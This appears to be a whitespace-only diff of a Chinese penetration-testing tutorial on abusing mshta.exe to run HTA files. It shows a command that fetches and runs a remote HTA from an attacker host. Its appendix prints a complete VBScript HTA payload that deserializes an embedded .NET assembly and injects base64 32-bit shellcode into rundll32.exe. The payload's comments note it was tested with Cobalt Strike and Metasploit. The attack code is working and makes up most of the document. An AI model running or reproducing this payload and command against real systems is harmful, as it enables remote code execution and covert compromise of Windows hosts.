@@ -1,4 +1,4 @@
-  
+
 ### Mshta简介：
 
 Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。
@@ -45,18 +45,18 @@ mshta.exe http://192.168.1.4/Micropoor.hta
 
 ### 附录：Micropoor.hta
 **注：x86 payload**
-```visual-basic
-<script language="VBScript"> 
+```visual basic
+<script language="VBScript">
 
 ' Usage:
 ' Choose a binary you want to inject into, default "rundll32.exe", you can use note pad.exe, calc.exe for example...
 ' Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt St rike, Metasploit Framework
 ' Run: cat payload.bin | base64 ‐w 0
-' Copy the base64 encoded payload into the code variable below. 
+' Copy the base64 encoded payload into the code variable below.
 ' Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32
-Dim binary : binary = "rundll32.exe" 
+Dim binary : binary = "rundll32.exe"
 
-' Base64 encoded 32 bit shellcode 
+' Base64 encoded 32 bit shellcode
 
 Dim code : code = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1Y
 P4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U="
@@ -88,7 +88,7 @@ ms.Position = 0
 
 Set Base64ToStream = ms
 
-End Function 
+End Function
 
 Sub Run
 
@@ -254,7 +254,7 @@ s = s & "AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGV
 
 s = s & "bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"
 
-entry_class = "cactusTorch" 
+entry_class = "cactusTorch"
 
 Dim fmt, al, d, o
 
@@ -262,7 +262,7 @@ Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFor
 
 Set al = CreateObject("System.Collections.ArrayList")
 
-al.Add fmt.SurrogateSelector 
+al.Add fmt.SurrogateSelector
 
 Set d = fmt.Deserialize_2(Base64ToStream(s))
 
@@ -270,7 +270,7 @@ Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
 
 o.flame binary,code
 
-End Sub 
+End Sub
 
 SetVersion
 
@@ -288,7 +288,7 @@ End If
 
 self.close
 
-</script> 
+</script>
 ```
 
 **来源：**  
